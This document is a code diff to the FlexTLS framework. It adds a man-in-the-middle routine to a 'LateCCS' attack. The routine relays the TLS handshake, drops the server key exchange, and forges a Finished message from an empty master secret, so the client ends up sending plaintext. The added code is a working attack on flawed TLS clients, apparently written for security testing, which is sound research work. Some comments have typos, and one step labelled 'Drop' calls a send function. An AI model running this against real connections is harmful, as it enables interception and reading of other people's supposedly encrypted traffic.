@@ -11,6 +11,7 @@ open FlexTLS
 open FlexTypes
 open FlexConstants
 open FlexConnection
+open FlexHandshake
 open FlexClientHello
 open FlexServerHello
 open FlexCertificate
@@ -18,6 +19,7 @@ open FlexCertificateRequest
 open FlexCertificateVerify
 open FlexServerHelloDone
 open FlexClientKeyExchange
+open FlexServerKeyExchange
 open FlexCCS
 open FlexFinished
 open FlexState
@@ -62,4 +64,59 @@ type LateCCS =
             Tcp.close st.ns;
             ()
         done
+
+        static member runMITM (server_name:string, ?port:int) : state * state =
+             let port = defaultArg port FlexConstants.defaultTCPPort in
+
+            // Start being a Man-In-The-Middle
+            let sst,_,cst,_ = FlexConnection.MitmOpenTcpConnections("0.0.0.0",server_name,listener_port=6666,server_cn=server_name,server_port=port) in
+
+            // Receive and Forward the Client Hello
+            let sst,nsc,sch   = FlexClientHello.receive(sst) in
+            let cst = FlexHandshake.send(cst,sch.payload) in
+
+            // Receive and Forward the Server Hello
+            let cst,nsc,csh = FlexServerHello.receive(cst,sch,nsc) in
+            let sst = FlexHandshake.send(sst,csh.payload) in
+
+            // Receive and Forward the Server Certificate
+            let cst,nsc,ccert = FlexCertificate.receive(cst,Client,nsc) in
+            let sst = FlexHandshake.send(sst,ccert.payload) in
+
+            // Drop the Server Key Exchange
+            let cst,cnsc,cske  = FlexServerKeyExchange.receiveDHE(cst,nsc) in
+
+            // Drop the Server Hello Done
+            let cst,cshd      = FlexServerHelloDone.send(cst) in
+
+            // Send the Client Key Exchange to the server
+            let cst,cnsc,ccke  = FlexClientKeyExchange.sendDHE(cst,cnsc) in
+
+            // Send the CCS to the server
+            let cst,_ = FlexCCS.send(cst) in
+            
+            // Start encrypting on attacker to server side
+            let cst  = FlexState.installWriteKeys cst nsc in
+            let clog = sch.payload @| csh.payload @| ccert.payload @| cske.payload @| cshd.payload @| ccke.payload in
+            let cst,cffC = FlexFinished.send(cst,logRoleNSC=(clog,Client,cnsc)) in
+
+            // Drop the CCS
+            let cst,_,_  = FlexCCS.receive(cst) in
+
+            // Start decrypting on atacker to server side
+            let cst = FlexState.installReadKeys cst nsc in
+
+            let verify_data  = FlexSecrets.makeVerifyData nsc.si nsc.keys.ms Server (clog @| cffC.payload) in
+            let cst,cffS     = FlexFinished.receive(cst,logRoleNSC=(clog,Server,cnsc)) in
+                       
+            // Compute the verifiy data on attacker to client side
+            let slog = sch.payload @| csh.payload @| ccert.payload in
+            let sverify_data = FlexSecrets.makeVerifyData nsc.si (abytes [||]) Server slog in
+            let sst,sffS = FlexFinished.send(sst,sverify_data) in
+
+            // The client and the attacker exchange plaintext after end of the handshake
+
+            // Forward the rest of the handshake and the application data
+            FlexConnection.passthrough(cst.ns,sst.ns);
+            sst,cst
     end
